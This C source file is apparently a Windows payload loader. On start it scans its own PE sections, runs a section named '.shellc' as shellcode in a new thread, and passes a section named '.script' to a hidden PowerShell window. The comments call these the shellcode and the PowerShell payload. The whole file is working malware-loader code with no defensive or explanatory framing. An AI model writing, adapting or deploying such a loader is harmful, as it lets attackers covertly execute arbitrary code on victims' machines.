#include <stdbool.h>
#include <stdint.h>
#include <windows.h>

bool _strcmp(const char* restrict a, const char* restrict b) {
    while (*a != '\0' && *b != '\0'){
        if (*a++ != *b++) 
            break;
    }
    return *a == '\0' && *b == '\0';
}

DWORD __stdcall pshExec(void* addr){
    // Prevent deadlock
    ShellExecuteA(NULL, "open", "powershell.exe", addr, NULL, SW_HIDE); // Execute Powershell payload
}

void _start() {
    static uintptr_t pModAddr = 0;

    if (pModAddr != 0) // Exec only once.
        return;

    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
						| GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
						(LPCTSTR)_start, (HMODULE*)&pModAddr);

    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)(pModAddr);
    IMAGE_NT_HEADERS* pNTHeader = (IMAGE_NT_HEADERS*)(pModAddr + pDosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* pSections = (IMAGE_SECTION_HEADER*)(pNTHeader + 1);

    for (int i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++) {
        if (_strcmp(pSections[i].Name, ".shellc")) {
            CreateThread(NULL, 0, (LPVOID)(pModAddr + pSections[i].VirtualAddress), NULL, 0, NULL); // Execute shellcode
            break;
        }
        if (_strcmp(pSections[i].Name, ".script")) {
            CreateThread(NULL, 0, pshExec, (LPVOID)(pModAddr + pSections[i].VirtualAddress), 0, NULL);
            break;
        }
    }
    return;
}
